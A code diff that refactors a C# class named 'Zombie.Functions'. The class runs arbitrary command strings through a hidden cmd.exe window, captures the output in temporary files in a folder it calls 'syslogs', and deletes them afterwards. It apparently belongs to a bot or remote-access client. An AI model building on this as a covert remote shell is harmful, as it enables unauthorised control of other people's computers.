@@ -21,29 +21,19 @@ namespace Zombie.Functions
         }
 
 
-        private static string _outputDir;
+        private static readonly string _outputDir;
         private static string _outputFile;
         public static string LaunchDirectory { get; private set; }
         public static string WorkingDirectory { get; private set; }
 
         public static string ExecuteCommand(string command)
         {
-
-            if (!Directory.Exists(_outputDir))
-            {
-                try
-                {
-                    Directory.CreateDirectory(_outputDir);
-                }
-                catch
-                {
-                    Console.WriteLine("Unable to create syslogs directory.");
-                }
-            }
-
+            string commandOutput = "";
             bool changeDir = false;
+            //bool outputEmpty;
             _outputFile = _outputDir + Guid.NewGuid().ToString() + ".txt";
 
+            CreateDirectory();
 
             if (command.ToLower().Contains("cd"))
             {
@@ -51,86 +41,41 @@ namespace Zombie.Functions
                 command += @" && cd";
             }
 
-
-            Process pProcess = new Process();
-            pProcess.StartInfo = new ProcessStartInfo()
-            {
-                FileName = "cmd.exe",
-                Arguments = $"/c {command} > \"{_outputFile}\" 2>&1",
-                UseShellExecute = false,
-                RedirectStandardError = true,
-                WorkingDirectory = WorkingDirectory,
-                CreateNoWindow = true
-            };
-
-
-            string commandOutput = "";
-
-
+            Process pProcess = CreateCMDProcess(command);
 
             try
             {
-
                 pProcess.Start();
-
             }
-
             catch (Exception e)
             {
                 commandOutput = e.Message;
             }
 
 
-
-
-            if (command == "notepad.exe")
-            {
-                return commandOutput;
-            }
-
             pProcess.WaitForExit(1000);
-            if (!pProcess.HasExited)
-            {
-                pProcess.Close();
-            }
-
-            if (File.Exists(_outputFile))
-            {
-                try
-                {
-                    using (TextReader reader = new StreamReader(_outputFile))
-                        commandOutput = reader.ReadToEnd();
-                }
-
-                catch
-                {
-                    commandOutput = "Error reading output.";
-                }
-            }
 
             try
             {
-                File.Delete(_outputFile);
+                if (!(new FileInfo(_outputFile).Length <= 0))
+                    commandOutput = ReadCMDOutputFile(pProcess);
             }
-            catch
+            catch (Exception e)
             {
-                Console.WriteLine("Unable to delete output.");
+                commandOutput = e.Message;
             }
+
+            DeleteCMDOutputFile(pProcess);
 
             if (changeDir)
             {
-                string newDir = commandOutput.Replace(Environment.NewLine, "");
-
-                if (Directory.Exists(newDir)) WorkingDirectory = newDir;
-                else commandOutput = "Error: The specified directory does not exist.";
+                commandOutput = ChangeWorkingDirectory(commandOutput);
 
             }
 
             try
             {
-
-                if (Directory.Exists(_outputDir))
-                    Directory.Delete(_outputDir, true);
+                DeleteOutputDirectory(pProcess);
             }
 
             catch
@@ -142,6 +87,86 @@ namespace Zombie.Functions
 
         }
 
+        private static void DeleteOutputDirectory(Process pProcess)
+        {
+            if (pProcess.HasExited && Directory.Exists(_outputDir))
+                Directory.Delete(_outputDir, true);
+        }
+
+        private static Process CreateCMDProcess(string command)
+        {
+            Process pProcess = new Process();
+            pProcess.StartInfo = new ProcessStartInfo()
+            {
+                FileName = "cmd.exe",
+                Arguments = $"/c {command} > \"{_outputFile}\" 2>&1",
+                UseShellExecute = false,
+                WorkingDirectory = WorkingDirectory,
+                CreateNoWindow = true
+            };
+            return pProcess;
+        }
+
+        private static string ChangeWorkingDirectory(string path)
+        {
+            string newDir = path.Replace(Environment.NewLine, "");
+
+            if (Directory.Exists(newDir)) WorkingDirectory = newDir;
+            else path = "Error: The specified directory does not exist.";
+            return path;
+        }
+
+        private static void DeleteCMDOutputFile(Process pProcess)
+        {
+            if (pProcess.HasExited)
+                try
+                {
+                    File.Delete(_outputFile);
+                }
+                catch
+                {
+                    Console.WriteLine("Unable to delete output.");
+                }
+        }
+
+        private static string ReadCMDOutputFile(Process pProcess)
+        {
+            string commandOutput;
+            if (pProcess.HasExited && File.Exists(_outputFile))
+            {
+                try
+                {
+                    using (TextReader reader = new StreamReader(_outputFile))
+                        commandOutput = reader.ReadToEnd();
+                }
+
+                catch
+                {
+                    commandOutput = "Error reading output. The file is being used by other process.";
+                }
+            }
+            else
+            {
+                commandOutput = "Error reading output - the process associated has not exited.";
+            }
+
+            return commandOutput;
+        }
+
+        private static void CreateDirectory()
+        {
+            if (!Directory.Exists(_outputDir))
+            {
+                try
+                {
+                    Directory.CreateDirectory(_outputDir);
+                }
+                catch
+                {
+                    Console.WriteLine("Unable to create syslogs directory.");
+                }
+            }
+        }
     }
 
 }
